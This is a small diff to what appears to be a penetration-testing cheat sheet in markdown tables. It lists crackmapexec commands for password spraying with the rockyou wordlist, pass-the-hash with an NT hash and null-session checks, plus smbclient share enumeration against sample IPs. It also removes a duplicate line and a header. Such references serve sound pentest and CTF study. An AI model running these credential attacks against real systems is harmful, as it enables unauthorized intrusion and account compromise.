@@ -66,12 +66,6 @@
 |  password spray   |
 | ------------- |
 | crackmapexec smb 192.168.1.1  -d ninja.corp -u MeME -P /usr/share/wordlists/rockyou.txt|
-| smbclient -N -L \\\\10.10.10.103 |
-
-
-
-| Linxu and Microsoft RPC Enumeration  |
-| ------------- |
 | smbclient -N -L \\\\10.10.10.103 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/' |
 | crackmapexec smb 192.168.1.1 -u MeMe -H NTHASH |
 |crackmapexec smb 192.168.1.1 -u '' -p '' #NULL Sessions|
